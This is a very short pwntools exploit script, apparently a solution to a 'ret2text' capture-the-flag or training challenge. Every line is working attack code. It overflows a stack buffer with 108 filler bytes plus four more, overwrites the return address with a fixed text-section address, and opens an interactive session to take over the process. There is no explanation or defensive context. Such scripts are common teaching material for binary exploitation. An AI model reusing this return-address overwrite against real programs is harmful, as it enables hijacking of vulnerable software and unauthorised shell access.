from pwn import *

p = process('./ret2text')

shellcode = 0x0804863A

playload = 'A'*108 + 'AAAA' +  p32(shellcode)

p.sendline(playload)
p.interactive() 
